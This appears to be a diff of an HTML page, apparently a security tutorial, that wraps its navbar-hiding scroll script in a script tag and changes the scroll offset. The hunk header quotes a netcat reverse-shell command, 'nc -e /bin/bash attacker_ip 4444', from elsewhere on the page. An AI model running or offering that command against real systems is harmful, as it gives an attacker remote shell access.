@@ -281,22 +281,22 @@ nc -e /bin/bash attacker_ip 4444</code></pre>
     </footer>
         
 // JavaScript to hide navbar on scroll down and show on scroll up
-let lastScrollTop = 0;
-const navbar = document.querySelector('.navbar');
+<script>
+    let lastScrollTop = 0;
+    const navbar = document.querySelector('.navbar');
 
-window.addEventListener('scroll', function() {
-    let scrollTop = window.pageYOffset || document.documentElement.scrollTop;
-
-    if (scrollTop > lastScrollTop) {
-        // Scroll down - hide navbar
-        navbar.style.top = "-60px"; // Adjust the height of your navbar
-    } else {
-        // Scroll up - show navbar
-        navbar.style.top = "0";
-    }
-
-    lastScrollTop = scrollTop;
-});
+    window.addEventListener('scroll', function() {
+        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+        if (scrollTop > lastScrollTop) {
+            // User is scrolling down, hide the navbar
+            navbar.style.top = '-100px';  // Adjust this value based on the height of your navbar
+        } else {
+            // User is scrolling up, show the navbar
+            navbar.style.top = '0';
+        }
+        lastScrollTop = scrollTop;
+    });
+</script>
 
 
 </body>
